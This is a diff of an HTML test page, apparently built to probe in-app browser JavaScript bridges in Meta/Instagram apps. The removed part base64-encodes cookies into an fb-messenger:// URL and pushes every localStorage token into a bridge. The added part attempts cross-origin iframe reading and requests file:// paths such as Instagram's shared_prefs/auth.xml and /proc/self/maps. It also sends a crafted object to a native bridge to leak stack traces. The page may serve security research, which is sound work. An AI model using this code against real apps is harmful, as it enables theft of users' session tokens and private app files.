@@ -1,28 +1,89 @@
-<div class="card" style="border: 2px solid #ff00ff; padding: 10px; background: #111;">
-    <h3 style="color: #ff00ff;">Advanced Exfiltration Test</h3>
-    <button onclick="testProtocolLeak()">Test Protocol Leak (Data to URL)</button>
-    <button onclick="testStorageSteal()">Leak LocalStorage to Bridge</button>
-</div>
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { background: #0a0a0a; color: #ff3e3e; font-family: monospace; padding: 15px; }
+        .card { border: 1px solid #ff3e3e; padding: 10px; margin-bottom: 15px; background: #000; }
+        button { background: #1a0000; color: #ff3e3e; border: 1px solid #ff3e3e; padding: 10px; width: 100%; margin: 5px 0; }
+        .log { background: #000; height: 250px; overflow-y: scroll; border: 1px dashed #555; padding: 5px; font-size: 10px; color: #00ff00; }
+    </style>
+</head>
+<body>
 
-<script>
-function testProtocolLeak() {
-    log("Attempting to leak data via custom protocol...", "success");
-    // Agar bridge sensitive hai, toh ye URL trigger hone par settings ya logs khul sakte hain
-    const secretData = btoa(document.cookie || "no_cookies_found");
-    window.location.href = "fb-messenger://share?text=" + secretData;
-}
+    <div class="card">
+        <h3>1. UXSS & Origin Bypass</h3>
+        <button onclick="testUXSS()">Test Cross-Origin Leak</button>
+        <iframe id="victimFrame" src="https://example.com" style="display:none"></iframe>
+    </div>
 
-function testStorageSteal() {
-    log("Scanning LocalStorage for Meta Tokens...", "success");
-    try {
-        let keys = Object.keys(localStorage);
-        keys.forEach(k => {
-            log(`Found Key: ${k}`, "intercept");
-            // Fuzzing the bridge with found storage keys
-            window.browserDeclutter.applyConfig({ [k]: localStorage.getItem(k) });
-        });
-    } catch(e) {
-        log("Storage Access Denied", "error");
-    }
-}
-</script>
+    <div class="card">
+        <h3>2. Sensitive File Scanner</h3>
+        <button onclick="scanPrivateFiles()">Scan /data/data/ Paths</button>
+    </div>
+
+    <div class="card">
+        <h3>3. Bridge Error Leaker</h3>
+        <button onclick="leakStack()">Force Bridge Stack Trace</button>
+    </div>
+
+    <div id="log" class="log">Ready for advanced testing...</div>
+
+    <script>
+        const logBox = document.getElementById('log');
+        function log(m, color="#00ff00") { 
+            logBox.innerHTML += `<br><span style="color:${color}">> ${m}</span>`; 
+            logBox.scrollTop = logBox.scrollHeight; 
+        }
+
+        // 1. Cross-Origin Access Test
+        function testUXSS() {
+            log("Attempting to read iframe content...");
+            try {
+                var frame = document.getElementById('victimFrame');
+                var content = frame.contentWindow.document.body.innerHTML;
+                log("UXSS SUCCESS: Origin bypassed!", "cyan");
+                alert("Leaked Iframe Content: " + content);
+            } catch(e) {
+                log("Blocked: Same-Origin Policy active.");
+            }
+        }
+
+        // 2. Bruteforce common Android file paths
+        function scanPrivateFiles() {
+            const paths = [
+                'file:///etc/hosts',
+                'file:///proc/self/maps',
+                'file:///data/data/com.instagram.android/shared_prefs/auth.xml',
+                'file:///sdcard/Download/config.json'
+            ];
+            log("Starting File Scan...");
+            paths.forEach(path => {
+                var xhr = new XMLHttpRequest();
+                xhr.open('GET', path, true);
+                xhr.onreadystatechange = function() {
+                    if (xhr.readyState == 4) {
+                        if (xhr.status == 200 || xhr.responseText.length > 0) {
+                            log("FOUND: " + path, "cyan");
+                        } else {
+                            log("Failed: " + path, "#555");
+                        }
+                    }
+                };
+                xhr.send();
+            });
+        }
+
+        // 3. Stack Trace Leak
+        function leakStack() {
+            log("Forcing Error Stack on Bridge...");
+            try {
+                // Bridge ko galat input dekar crash/error force karna
+                window.iabjs_unified_bridge.postMessage({ toString: function() { return window.location; } });
+            } catch(e) {
+                log("Stack Trace: " + e.stack, "yellow");
+            }
+        }
+    </script>
+</body>
+</html>
